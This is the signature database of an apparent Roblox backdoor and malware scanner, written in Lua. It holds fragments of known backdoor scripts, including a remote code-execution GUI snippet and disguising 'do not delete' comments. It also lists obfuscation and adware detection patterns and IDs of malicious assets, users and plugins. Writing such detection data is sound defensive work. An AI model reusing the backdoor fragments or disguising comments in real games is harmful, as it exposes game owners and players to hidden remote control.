27O2782JW27827G2GN27527827827Y2JW27G2KD1Z132231Z2KK1Z2J421D22S1Z27Y2KL2JQ2KV2KZ2172JV2752J42KX2L32KR1]], - Obfuscation Code Unecessary due to obfuscation detection

	[[= player.PlayerGui
		local Execute = Gui:FindFirstChild(self.directories.Execute, true)
		local Clear = Gui:FindFirstChild(self.directories.Clear, true)
		local Code = Gui:FindFirstChild(self.directories.Code, true)
		assert(Execute and Clear and Code, "Invalid directory! Please optimize in Settings.Directories")
		Execute.MouseButton1Click:Connect(function()
			local env = setmetatable({}, {
				__index = function(_, Function)]],

	[[yer:IsInGroup(self.settings.WhitelistGroup) or table.find(self.settings.WhitelistedUsers, player.Name) the]],

	[[log backdoored]],

	[[aze.whitelist = require(scr]],

	[[.UpdateCode:FireServer(script.Parent.So]],

	[[Backdoored game]],

	[[rprxy.xyz]],

	[[on.Parent = Gui.LoggerFrame.S]],

	[[This is the Hardware of all Roblox games. This is like the System 32 of Roblox.
If you delete this, your game could be deleted or may just cause lag and crashes.]],

	[[https://www.psu.dev/]],

	[[discord.gg/psu]],

	[[This module is responsible for generating Script effects. Do not remove or the plugin will break. (Jerome#1018, Plugin Studios)]],

	[[This Script Manages Default Camera, Removing may cause issues both in Studio & in the ROBLOX Client]],

	[[--This script loads the songs when it's on a published game. It will give an error when testing in studio. Don't mind it]],

	[[For this script to work, in game settings under security, please enable third party teleports.]],

	[[2637091265*2+2+2+4-3+3]],

	[[5412955559]],

	[[turn on Third Party Teleports in your security tab]],

	[[1601509548]],

	-- [[26J27524026W26C26C26826B24Q25B25B26S26X26B26R27326A]], - Obfuscation Code Unecessary due to obfuscation detection

	[[this is not for "exploiting" purposes, this is a private admin module for me and my friends to use on our games, thanks please don't delete this since we worked hard on it <3.]],

	[[Input(input)
        local Delta = input.Position - dragStart
        local Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + Delta.X, startPos.Y.Scale, startPos.Y.Offset + Delta.Y)
        game:GetService("TweenService"):Create(Frame, TweenInfo.new(0.25), {Position = Position}):Play()
    end
    Frame.InputBegan:Connect(function(input)
        if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) and UIS:GetFocusedTextBox() == nil then
            dragToggle = true
            dragStart = input.Position
            startPos = Frame.Position
            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then
                    dragToggle = false
                end
            end)
        end
    end)
    Frame.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
            dragInput = input
        end]],

	[[ragify(Frame)
    dragToggle = nil
    local dragSpeed = 0.50
    dragInput = nil
    dragStart = nil
    local dragPos = nil
    function updateInput(input)
        local Delta = input.Position - dragStart
        local Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + Delta.X, startPos.Y.Scale, startPos.Y.Offset + Delta.Y)
        game:GetService("TweenService"):Create(Frame, TweenInfo.new(0.30), {Position = Position}):Play()
    end
    Frame.InputBegan:Connect(function(input)
        if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) and UIS:GetFocusedTextBox() == nil then
            dragToggle = true
            dragStart = input.Position
            startPos = Frame.Position
            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then
                    dragToggle = false
                end
            end)
        end
    end)
    Frame.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
            dragInput = input
        end
    end)
    game:GetService("UserInputService").InputChanged:Connect(function(input)
        if input == dragInput and dragToggle then
            update]],

	[[\x72\x65\x71\x75\x69\x72\x65]],

	[[_G.env=getfenv()]], --Possible remove this detection as it is unnecessary

}


--// Strings to detect obfuscation \\--

DB.Obfuscation_Detection = {
	[[require(tonumber(]],

	[[SynapseXen]],

	[[Please make sure your Lua implementation supports non-null terminated strings]],

	[[Obfuscator]],

	[[_=_G; _______ = _["\x52]],

	[[iDAuBJnU6EP =]],

	[[AspectNetwork]],

	[[local BinaryEncrypted]],

	[[_G.EncodedBinary]],

	[[Luraph]],

	[[hi my 2.5mb script doesn't work with xen please help]],

	[[xen doesn't come with instance caching, sorry superskater]],

	[[,pcall,tonumber,math.random,tostring,wait or Wait,Game or game,script,Instance.new,getfenv,Workspace or workspace,next,Spawn,type]],

	[[end)(string.byte,table.insert,setmetatable)]],

	[[OBA Engine]],

	[[local R=string.byte;local Y]],

	[[:gsub("(".. ("[01]"):rep(8) .. ")"]],

	[[[string.reverse(tostring(string.reverse]],

	[[0x39DB7846*(2+2+2-1+2+2-4)]],

	[[tonumber(string.reverse(]],

	[[ScriptCryptV2ByAsceylos]],

	[[return(function(e,l)local X=table.insert;local s=table.concat;local A=getfe]],

	[[Cryptedrequire(]],

	[[return require(tonumber(ID:gsub("1",""):gsub("(%z+)\1",function (Bit)]],

	[[return string.char(string.len(Bit))]],

	[[LPH!]],

	[[LPH|]],

	[[obfuscated]],

	[[IronBrew]],

	[[AztupBrew]],

}


--// Code snippets which use the string formats \\--

DB.Code_Snippets_Formats = {
	[[local Updated = require%b()

if Updated == "Module is up to date!" then
	print%("Models are up to date!"%)
else
	print%("Models are not up to date, there may be a vulnerability%."%)
end]],

	[[require%b()%.StopYouHaveViolatedTheLaw%b()]],

	[[require%b():Fire%b()]],

	[[if Debug then
	require%(game%.ServerScriptService%.MainModule%)%(Config%)
else
	require%b()%(Config%)
end]],

	[[d[åäeao�]+ng[%.%s]+you got owned]],

	[[script[%.%s]+or[%.%s]+is[%.%s]+it]],

	[[require%b().daddy%(]],

	[[game%.Players%.PlayerAdded:Connect%(function%(plr%)
require%b()%.feet%(plr%.Name%)
end%)]],

	[[require%b()%.load%b()]],

	[[require%b():Run%b()]],

	[[Tazer %d+%.0]],

	[[local mymodule = require%b()
mymodule%.antibackdoor()]],

	[[local mymodule2 = require%b()
mymodule2%.antibackdoor()]],

	[[local wat%s*=%s*%d+]],

	[[require%b():sliv%(]],

	[[require%b():aurora%(]],

	[[%b()%.AntiCheat%b()]],

	[[Last synced %d/%d/%d %d:%d || RoSync Loader]],

	[[string%s*%.%s*reverse%s*%b()%s*%]%s*%b()]],

	[[if%s+not%s+game%s*:%s*GetService%b()%s*:%s*IsStudio%b()%s*then%s+require]],

	[[getfenv()%[%s*string%s*%.%s*reverse(]],

}


--// Obfuscation detection which use the string formats \\--

DB.Obfuscation_Detection_Formats = {
	[[[il1][il1][il1]+=string]],

	[[[il1][il1][il1]+={]],

	[[#%s*{]],

	[[[il1][il1][il1]+ = unpack]],

	[[local %a=string%.byte;local %a=string%.char;]],

	[[\[123456789]+\[%d]+\[%d]+\[%d]+]],

	[[Synapse%s+Xen]],

	[[[il1][il1][il1][il1][il1]+%s*=]],

	[[function [il1][il1][il1][il1][il1]+%(]],

	[[["'%s,]+[01][01][01][01]+["'%s,]+[01][01][01][01]+["'%s,]+[01][01][01][01]+["'%s,]+[01][01][01][01]+]],

	[[pcall%(require,%a%(%a:sub%([%d]+%)%)]],

	[[RiftX[il1][il1][il1]+]],

	[[local%-%-%[%[]],

	[[local%s+%-%-%[%[]],

	[[[%w_%.]+%+%d+ end;return table%.concat%b()end;local [%w_%.]+=[%w_%.]+%(']],

	[[[%d%a_]+%[%d+%]%.%.[%d%a_]+%[%d+%]%.%.[%d%a_]+%[%d+%]%.%.[%d%a_]+%[%d+%]%.%.[%d%a_]+%[%d+]],

	[[\x[%x]+\x[%x]+\x[%x]+\x[%x]+]],

	[[string%.byte%(%s*%d+%s*,%s*%d+%s*,[%s%d,]+%)]],

	[[getfenv()%s*%[]],

}

-- // Formatted adwere detection

DB.Adware_Detection_Formates = {
	[[PlayerAdded:connect%(function%b()%s*if%s+not%s+[%w%d_]+:PlayerOwnsAsset%([%w%d_]+%s*,%s*[%w%d_]+%)%s*then%s+[%w%d_]+:PromptPurchase([%w%d_]+%s*,%s*[%w%d_]+)%s+end%s+end%)]],

	[[local%s+[%w%d_]+%s*=%s*[%w%d_]+:GetService%("MarketplaceService"%)%s*for [%w%d_]+,%s*[%w%d_]+ in [i]?pairs%b()%s*do%s+market:PromptPurchase%(%s*[%w%d_]+%s*,%s*[%w%d_]+]],

	[[for [%w%d_]+,[%w%d_]+ in pairs%(.+:GetPlayers%(%)%) do%s+[%w%d_]+:Teleport%([%w%d_]+,[%w%d_]+%)]],

	[[PlayerAdded:Connect%(function%([%w%d_]+%)%s+[%w%d_]+:Teleport%([%w%d_]+,[%w%d_]+%)]],

	[[for [%w%d_]+,[%w%d_]+ in pairs%(.+:GetChildren%(%)%) do%s+[%w%d_]+:PromptPurchase%([%w%d_]+,[%w%d_]+%)]],

	[[[%w%d_]+:Teleport([%x]+,%s*[%w%d_]+,%s*[%w%d_]+]],

	[[game%.Players%.PlayerAdded:Connect%(function%b().+game:GetService%("MarketplaceService"%):PromptPurchase%([%w%d_]+%s*,%s*%d]],

}


-- // A list of malicious require ids. The reason there are seperated from maliciouscodesnippets is to increase performance.

DB.Bad_Require_Ids = {
	"5715556818", "5555475667", "3041175937",
	"5098883048", "5292040425", "5182026494",
	"5245156880", "5245171754", "4751241292",
	"5246374811", "4952999255", "5247019873",
	"5246507325", "5245844180", "5245638301",
	"5246249950", "5245264993", "5072873486",
	"5121269775", "4790475255", "4670913700",
	"2556021288", "5090011414", "5104777071",
	"1683222792", "5084588396", "5059012307",
	"5084744245", "5084743656", "5084743398",
	"5084743088", "5084743939", "5084743622",
	"5084743364", "5084744100", "5084743821",
	"5084743520", "5084743249", "5084742926",
	"5084762641", "4062872368", "4821417050",
	"5031529929", "4794986644", "5077231493",
	"4880027249", "5015642331", "5029199151",
	"4856317205", "4986595724", "4986541548",
	"4656102360", "5004500405", "317901985",
	"4977832031", "4617777367", "4852273118",
	"4794986906", "4850318089", "4582121027",
	"4850721608", "3664252382", "4958213401",
	"4953968226", "4921021305", "3667797501",
	"4830555922", "1501837051", "3888462881",
	"3888345526", "3888476620", "4491609670",
	"3888333956", "4797950693", "4722188262",
	"3979093751", "4725588986", "4710802387",
	"73016023", "2655056793", "4735494320",
	"4712695127", "4723753937", "4104356837",
	"3279983046", "4728931941", "2588997359",
	"2342106098", "2588355688", "4707923523",
	"4707908850", "4509414898", "4696605318",
	"4648191831", "3571206277", "3068230330",
	"3697754730", "1389106135", "3505921445",
	"855371127", "306895131", "2527899984",
	"2531777909", "2499904369", "3517374790",
	"4672757644", "2531912755", "4600242709",
	"4679935477", "4658857698", "4644097080",
	"4609898761", "3160879926", "2501525825",
	"2501549711", "3019584266", "4433921552",
	"4229612988", "4178953416", "1006051316",
	"3612801610", "3719239687", "520532182",
	"5266205158", "3856263791", "3635228248",
	"3856241656", "5406938800", "01546813029",
	"5542303780", "5283742896", "5289785933",
	"5289794324", "5410639662", "625876374",
	"400942773", "5585624332", "5481376941",
	"5656071387", "5656062561", "5770222512",
	"5490813641", "0x146ec9ad4", "5924975050",
	"5925041363", "0x1554DC1B0", "5151855975",
	"5915575426", "5915578889", "5915565317",
	"5915563830",
}


--// Hashes of safe scripts to prevent false positives \\--

DB.SafeScript_Hashes = {
	"6edff1c79022da7ac166072e24fec5c0c99c7c78",
	"59fc92d1eb1c511583ba166ff3a38d2667c932d5",
	"87914459cd8fbf7193290a8ff62f86bb9e294771",
	"6e3e6b42898fe82a9111752a8ff690a444079115",
	"eabf480fe6132e0b93f153e147422a9fc558573c",
	"b2ebae1020c85099fdf3be24510e9856297c612b",
	"da67537cb4bb57cb90fdc5875227d24431a8151f",
	"c38b5af3aebf503a568ea1c1ff21de436b27faa2",
	"cc5bea1899885e42e80446aea4e370cf4d0a7738",
	"3f35754795d78f10502ad96243fdb0752fbe22f1",
	"1275c6177490dde45e217b899ce0396e5e5c9568",
	"05051b746c827eb646b7988190b4d3ecde12c205",
	"ef6612ce8f3f78bbdae37c333c984ab309fbd0b1",
	"806148224bc6fe47912cf07e347bec2936ef5df8",
	"c4b32e58e917b31af526c5e166f483e9c89aa587",
	"baad2e6a3b11c6ee990fcd1038d992d3d8faa1d5",
	"5901b54cab04fea25a897fb625064b349afc8a05",
	"620f919ec69aa92309638fad9018003ab1e2cd6d",
	"39ef555061716be59ee5af978d206dacc04bebce",
	"b89c9f9f3720c36387d944949b867cb46ec18b5b",
	"d32aad42b515692fef7b42fe6a1f8fe4e03e8c25",-- Might Tea 2 Cleaner
	"08dcf035b15b4a32eb437ed1424c84158bfd6fae",
	"4a0be521173ddd9a85ef8ca7e2ba3947b0ef8ce3",
	"c8c174131ca2b407c6253c16f37204eec685cdb9",
	"d9f134163aefe78512d3fb6d6ad6c6b1361bf9e9",
	"94f3b94d5dd2f44a6f5299231305a50369194011",
	"0ee8deb16e5acb9f277b13654e12cf5fa36c8ffc",
	"af4afb476813da1fbad5965084ab9e95b08073b5",
	"8434cfd5abde451e5670b02f55319986976c7cf6",
	"874757006667ea3a2fcfb2484813614e28de4c1b",
	"c3fcb821ff984b8abf2ac43a32e9ee4f5bddb07f",
	"3e0961c04599c57eb525e2cd5caca1b6365e451e",
	"87b1f24809ad5133b1eeb19e2a48e8a04f88a748",
	"b6cbc29e689084465fdd6363b1a00b2c3f33552c",
	"a9e433a11227c86d3ca2d34306076afb3e539d31",
	"d9b6491e8de59233da9c9ab6fe859857724826d5",
	"a81972d85ed10202bbe66f38e5c150e1e36dc4e8",
	"a510c95b66a15774e1abb67d8fc9f1b9669360e7",
	"13a54c8f38fecbefb72200bbae5957825b185594",
	"d6f5aa4ba3bbd711ba9459cc5af61445283cffd0",
	"4e9f3197dcb2287a40efdb1bb57389910cba4887",
	"4707ba8e07688ec86a419f4cdecba6fe824ebe9c",
	"5aa357d0f91c0d781832f6edf681a78ee686a647",
	"80ad6be5c0ef13e18084a745f7d0274ce4ef6429",
	"3aedc88cc86b7ae9c81dd11c182e507515556a35",
	"fd7db11cb142a406381184b11ed35132b6cb7888",
	"e3260aefb988eddb65435bdea614c51c1620dc38",
	"5287320b24f4b0d29d0483d42a194df902a32357",
	"bb1aeab4f8a6b94461cc599451b29e62309d1b14",
	"9f530860116adddc07f9d75659835b98e1a4a7b3",
	"53c1a686d7531b8437e14764b005a1671e012c42",
	"4528a3aeb5af2d5ad7a52a8d49e1b36af31a971f",
	"cec7f5a648974de2a412a763e6bec13201871e06",
	"f77154aec93a545b09a14181bbff96c7ebde357c",
	"1115a801623a54a846345cb5b11d9b673aa323a1",
	"3924eda6c34a707407ae305c1e0eff0bd70734c5",
	"cefabb4dd1dc503af46f2c420eec00e854964af3",
	"8934fa30674f56538f13b7e92e46d39c70aa8ff3",
	"08a7c1bb6eb13c89509aa87585dadd0bf6aba6b5",
	"0dbda80c62c65768f19ebf25c412c1ef0ff6680a",-- Ro protect animation script
	"c04408f20ec54b25e31af725da8e6fb74b590fa6",-- Anti Virus PRO used by Vira Killer
	"5500520289d3cbb76fe6dcfd46d70ab37fb6065b",-- Falcon Scripting art script
	"7c869595d654672b3179534dad0191b4c0821c75",-- Doggity anti Virus
	"c0da21c3df467638fe72dc2989060ff16395b9f1",-- Doggity main AV module
	"97b5a72ae05619981d63bf02a67b1c26be3d61bb",
	"db88ea53e260c2b900db902871a6ce5beaac62e6",
	"586d7ce4a3b256f7517c154625aa969421315a81",
	"7f1360d1a3e05d8ee1d068d22456f82228aa8ad4",
	"9cf4cd56ee4fb1902984628ef607e1c64825c647",-- Doggity AV UI
	"321f68645f41d62c63a483fb0ac4f47be11ea2e6",-- Ro Protect UI element
	"42a5e52a35a8731eadd73b5cd1a3b71196afe0f4",-- RoProtect main
	"9ec4fa956c5cf9155dbeeec71aa8a210c9cf00bf",-- RoProtect UI element
	"31da2d602dc0680650c1c81bc18caa6d1d31f4b9",-- RoProtect scanner
	"96574ccef8f46493797b7c0738975f13231707a5",-- Ro protect UI element
	"1106226cfd0a0290ebd194727d2b75f8457359b6",-- RoProtect UI element
	"7872286d4ca33dc0d69ab1007f02ebbd37365635",
	"9bc6837144511d33fa57ee36823efded3c2e292d",-- RoProtect READ ME detection notice
	"94420ff7dc84e3bc9067d48848f0ee92f5564539",-- Stravant resize align
	"e6de5cef63c0385de710c1eca4e48c493432ca99",-- Ro Defender
	"e3a46c9787950ec2c95477359e992e51a5aa4a67",-- Ro Protect launcher
	"0a5f4f85cbc3fcf3ec59104c08dbd31f38096536",-- RoProtect scanner
	"042eef9450b6a33c165acab4c0d529e3cf420664",
	"5bad26f74ecbb0fd96b0d397031106acc5165868",-- Server Defender Core
	"38c48160b814339219f70a660caae7d78f409117",-- Ro Protect viruses found UI updater loop
	"765c2c7565b31fb752f4e8fcf3c651c0271ddf88",-- Ro Protect viruses found UI updater loop
	"7d64b462ea08c1c150496bf3dea15b3b4925b2c9",
	"af81debe99b3dd18a0329396fb7a9f8839838a54",
	"8327550b9c4653b621f22d0ada170669533a2196",-- Venom main script
	"a1ddc0c932cb814fee2fe6fb0bdc140b8b458519",-- Hidden infection scanner
	"340d89d2d84af294e9177b8cb836f535c0cf6bde",-- Known infections table Infection Remover
	"5f00e11b44dc36811f23a6f28f8a4e91d05e72f3",-- Known infections table Infection Remover
	"f964749da3a94dd1f3561534ea7daabe3ec61765",
	"fccda405abd42a076bc40761394cf49e6f8e6d37",
	"17520ae0cdfc91ec1e6c6ace77ee4a65aaa0c5de",
	"dbb7aeb46f04e173cb5f02310994c37de6c7ba86",
	"02ed78fd218da3bb0a0729313ba4694a3b4ddad0",-- Adonis change log
	"06106cf81cd3eb8769ffc59f5e9981a8657d010f",-- Welding script
	"1b770aae7762befc195c99d7f962bee8a609a8c6",-- Adonis Anti exploit client
	"b4a063bb8b474cd175206b4635d57db945102625",-- Adonis Commands module
	"3f6d9be0a483985684b1574339d06666c34e6f16",-- Anti Virus - https://www.roblox.com/library/77495793/AntiVirus-Free
	"9afd0ad5997fc6096e1d7de65c74dbdf06f75a8d",-- LockSmith backdoor scanner module
	"d057a2e20d7806f898eb7dc9dc39f38a0dc688e8",-- LockSmith main
	"25916b919090b719afdf8f8e1d93abebd45deace",-- GameGuard V2
	"a38c655440255629850293bd54151885f9cbdc63",-- Kronos Backdoor Scanner
	"f3a1604bf65eb771be2c0b3f5bfb8ed0fa7a02ce",-- Lord starrks anti virus
	"69b6e8c1250af42432f40354d2c1d9acfc7e96cd",-- Lord starrks Plugin Data
	"7bc8df6748ee1d8ccbf031e5bca3c15f4071c222",-- ACE anti virus
	"4caa4f26c8c32a8ed8734bdb03cb77ae3dff6d9a",-- Script Quarantine - https://www.roblox.com/library/5707182290/Script-Quarantine
	"a9283194820e9ba1f960589a64a1a3be4a59da7f",-- Roblox Default Chat "ChatMain"
	"411c094000106ef4ee9343c14b6135dffe88891d",-- Roblox Default Chat "ChatWindow"
	"0bb97ff040609ce22e9e35172f674d0e9322d81d",-- EISS ChangeLog
	"9eec77535fbe413c67799cfd42f96e932391d2d8",-- EISS Loader
	"1c277e46179cfdbf832d1d063a9c8dd5d655fc4b",-- EISS MainModule
	"6313f98b61a073a3f90a9b3a65a6a159686c60db",-- Avelos Admin loader - Note don't use Avelos Admin / Novus server manager for anti virus or for anti exploit. It contains neither.
	"292b8eb7914ba8ab7cc1ba73f12e16b01f6b4d75",-- Avelos Admin Settings - Note don't use Avelos Admin / Novus server manager for anti virus or for anti exploit. It contains neither.
	"9387f3a7a2bfbdaf3f7964b7f1dc2762abfcd5fc",-- Scriptos archimedes gui module
	"e78e9aa1d683278e87c02035985c8d71579c6a9e",-- Realism mod day and night cycle script
	"b95b31659137f27377c26fdb77a5b71d34f8b0c7",-- Edge align script
	"f7b6c56bf0c5f703d8627cfbf70476eb9bfa661a",-- Gap Fill script
	"1854ac7ba0e3b195e7872135d798630d6dfad017",-- Gap Fill script
	"99989baccc05b222e0dec4a423b11d46448cd4f7",-- Realism mod main script
	"01195109718092dfa7ac65d977c7a234b9f5d88d",-- Multi move script
	"befcb80c8b90b623bcc5c0ab9dd10f4adca68ea6",-- Resize align
	"e21bb5ae30b494696ef07b924a2ac22297c31ff3",-- Resize align
}


--// A List of safe model ids which the scanner might otherwise detect. \\--

DB.SafeModelIds = {
	2732065843,3239236979,2373501710,
	359948692,3239236979,5227878809,-- Note don't use Avelos Admin / Novus server manager for anti virus or for anti exploit. It contains neither.
	3516848054,1868400649,518094091,
	512742721,
}


--// A List of safe plugin ids which the scanner might otherwise detect. \\--

DB.SafePluginIds = {
	5121131624,167126759,3499696546,
	2778962144,142273772,5476045255,
	3550088966,2670956620,4917364372,
	165534573,5363437288,5054344511,
	381046418,142959977,4216304328,
	164968707,
}


-- // A list of bad groups which upload malicious assets.. \\--

DB.MaliciousGroups = {
	7688235,8970878,8885901,
}


-- // A list of bad users which upload malicious assets. \\--

DB.MaliciousUsers = {
	1002263925,1778676153,1751088619,
	350082947,1833012727,222104580,
	1738467,688023197,1841476885,
	1841508913,1418091035,1824492836,
	1749134566,1832231975,1038536936,
	2260459174,1774330368,2237418592,
}

--// A List of the known malicious plugin ids \\--

DB.MaliciousPluginsIds = {
	3505516906,3970514733,160457204,
	3979966687,3620029023,3614280305,
	3109259288,2631801555,3511788021,
	2715008764,4018527477,2631594863,
	2661950443,2644964458,2631801555,
	2644964457,2715008764,2672245855,
	3442672940,2644964454,2672245883,
	678183094,419740683,418773926,
	3703353560,3703352523,3703351017,
	3703349786,3703348425,3703346260,
	3702576437,3702575401,3702574362,
	3702468367,3702440544,4546947541,
	4577953821,4577956662,4577972750,
	4577962379,4600011400,4568630998,
	4593798746,4597853145,4598298121,
	4569667445,4602311885,4628794065,
	417843035,415256575,414993280,
	4518886395,4518890979,3702425881,
	414961308,414903118,113364861,
	2672245890,3448124880,3510360729,
	2644964449,2661950467,2661950445,
	2613864560,2661950461,2623611354,
	2634252959,2760053105,2623611352,
	2760053108,2623611348,3664816543,
	2787024683,3622467610,3736586479,
	4503953645,2656826153,3703347385,
	4625982623,4616198606,4593270188,
	4633612096,4634338975,4633518679,
	4628852963,4633534454,4633530934,
	4633200718,4628849504,4668541405,
	4657683663,4633509953,4669754547,
	4674921046,4657772222,4657680834,
	4657680085,4657686498,4657688259,
	4657687313,4686277808,3282101835,
	3610985790,3620916359,3510445485,
	2787024663,2655565054,3664187642,
	3328292627,3745147634,3505506129,
	3633794640,3320045603,3320031385,
	3328279741,3665828829,3390238326,
	2338336838,3442596285,3504329550,
	3976193892,3970465753,3976174426,
	3976195272,3976620715,3976656034,
	3873491088,3873465874,3873455886,
	3873448321,3873428841,3873416714,
	3980010832,3970392013,3901419807,
	3351300478,1198363829,1997381523,
	1119510530,869690527,415001366,
	1198092634,489937255,481912220,
	419847782,419811925,564265857,
	2748528182,4488609078,3397500272,
	4307056497,152153809,1331655594,
	342137348,151643348,878662641,
	146500006,926641903,167776461,
	191804266,1112477793,147593918,
	997531218,4652646115,763983652,
	2516571913,176319945,148950613,
	596379408,163634534,3483627366,
	4289490895,160936671,4439105154,
	1231813337,176319475,308038221,
	4690697777,2995137842,1037757090,
	4702136078,4702156010,4662650784,
	4657771270,4347968267,2531454958,
	4499231340,338338840,4716099159,
	4709361587,4601168640,4523278668,
	4613885366,4669681223,4655911306,
	4633696910,4560358824,4560356232,
	4538623931,4538677941,4534271421,
	4863624219,4864404814,4863366172,
	4880083102,4840245745,4880091950,
	4895471408,4911695732,4840216320,
	4912828815,4906877502,4912091139,
	4840285073,4898923432,4898865604,
	4898878619,4898887674,4898872376,
	4821335776,4910680615,4910338914,
	4821333460,4840189322,4804846446,
	4804812511,4908614373,4836591095,
	4836629250,4840240382,4840224100,
	4840163679,5718315875,4840229959,
	4840203826,4840252644,4840264628,
	4908612183,4919389349,4927307181,
	5168986922,5178525288,5045212184,
	4924745178,4923868340,4915083418,
	4939617069,4928568267,4894275766,
	4936378192,4932813865,4932863914,
	4932985702,4933083314,4932847496,
	4933096162,4941155360,4932069538,
	4915184857,4936514169,4940243760,
	4482353592,4283450281,4256564289,
	4231014616,4670463703,4041585502,
	4025486134,4041588010,4582428104,
	4729364572,4728617712,4728565883,
	3288058696,4732731595,3104443226,
	5238319033,5238194706,5236577579,
	4025488082,4737754167,1198456932,
	2656826137,1290037705,1198079690,
	4742850465,4742479164,4739087546,
	4742480404,4742433843,4744903156,
	4742708820,4741880451,4748072103,
	4977844047,5672762836,4967780035,
	4973200479,4972877968,4990151940,
	4982478536,4958365277,4989287444,
	4936718404,4840580832,4970546106,
	5019575699,4964521519,4856854139,
	659505827,4986626405,4970533346,
	5027682272,4977495041,4958219750,
	5029907851,5015741150,4952829958,
	5056462914,5074555023,5075697531,
	5065586601,5064712799,5075679388,
	5038232215,4912077003,5080927687,
	5080856164,5080831932,5080937295,
	5236497880,5237977152,5237976166,
	5712265461,4840199487,5722873873,
	5077323623,4830142810,4139197388,
	4769994836,4018546695,4830007552,
	4239065681,4830114913,4491619986,
	5238096515,5236505999,5236632984,
	5237917613,5230649809,5217889232,
	4752603939,4830047158,5104803179,
	5109887609,5108497694,5110448949,
	5236503476,4921924503,5183204511,
	5110767026,5110770976,5110772207,
	5110769524,2556480575,4986638865,
	5715181527,5112424591,5096570428,
	4965465362,5075708273,5113479234,
	5197392987,5182699573,5231878111,
	5113492594,5015865410,4937795629,
	5112436389,5112432545,5112442161,
	5236488096,5235450904,5235686274,
	4155099772,3146633195,4880088583,
	4155117338,4975049081,4532147242,
	4744892446,4671121406,5096569040,
	5075619331,5075658749,5096595109,
	5096594269,5096771564,5096569545,
	5096569510,5654151077,5096593123,
	5403343851,5410889588,5407764933,
	5408308240,5422739108,5383736664,
	5096594235,5096594172,5096593191,
	5096594325,5722540246,5723115479,
	5096594241,5096594231,5096593915,
	5096772441,4953292509,5096569489,
	5096577062,5096568629,5096569357,
	5096594308,4986642238,5096594254,
	5096594153,5096569453,5096786434,
	5724055406,5096597911,5096594271,
	5132864684,5429961553,5422357461,
	5096576794,5096593657,5096594442,
	5096577008,5096593547,5096568671,
	5096598275,5096594323,5096594195,
	5096771672,5096594168,5096597904,
	5096771514,5096592968,5096568546,
	5096772437,5096725562,5096599422,
	5403750512,5096594167,5096593407,
	5096630055,5414975959,5385495025,
	5966875140,5967612588,5879252454,
	5096568443,5096568300,5096593616,
	5096569097,5096578249,5096569178,
	5096772028,5096577144,5096568312,
	5096568322,5096772477,5096592850,
	5096594282,5096593092,5096568836,
	5096598015,5096592997,5096594152,
	5410343999,5429661174,5351664164,
	4832621975,5096595082,5096577125,
	5096786535,5096593343,5096594946,
	5096577430,5096592873,5096787531,
	5096577295,5130468231,5149168509,
	5115257344,5122911840,5123201848,
	162333086,4986783068,5123159337,
	2658217401,4693394127,4908888339,
	4830040113,4986649465,4986652848,
	3068834603,4779181340,4861898716,
	4041634577,5722654846,5723264887,
	5722775429,5722907035,5722593656,
	5722949253,5724210249,5722819439,
	5724007355,5723016100,5724134539,
	5724079620,5724278580,5722705373,
	5353634327,3001328804,5272472510,
	4986656560,5654125826,5600686528,
	5562094099,5748052672,5755604315,
	5805271899,5197163142,5606531511,
	5289019192,5755535742,5075686331,
	5647231678,5820976894,5815216891,
	5801408229,5801398057,5854191420,
	5677325089,5843091782,5770454604,
	5606857399,5821576411,5727681596,
	5988685767,5992220373,5992208150,
	5957226629,5977013203,
}

return DB